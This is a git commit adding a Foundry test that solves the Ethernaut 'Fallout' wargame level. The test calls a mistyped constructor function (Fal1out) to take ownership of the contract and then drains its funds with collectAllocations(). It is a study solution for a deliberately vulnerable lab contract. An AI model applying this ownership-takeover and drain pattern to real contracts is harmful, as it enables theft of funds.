30d57239c6d7bc80835ec981f2af6a1ae13ede2d
Kristjan Kosic <kristjan@protokol.com>
2022-08-30 07:50:38 +0000

    chore: Fallout test done

--- test/Fallout.t.sol
+++ test/Fallout.t.sol
@@ -34,6 +34,17 @@ contract TestFallout is BaseTest {
         vm.startPrank(player);
 
         /** CODE YOUR EXPLOIT HERE */
+        // https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5
+        // run with: `forge test --match-contract Fallout -vv`
+
+        // bad constructor implementation and typos...
+        emit log_named_address("Owner", level.owner());
+
+        level.Fal1out{value: 1 wei}();
+        emit log_named_address("Owner", level.owner());
+
+        // let's emty the allocations now that we are owners
+        level.collectAllocations();
 
         vm.stopPrank();
     }
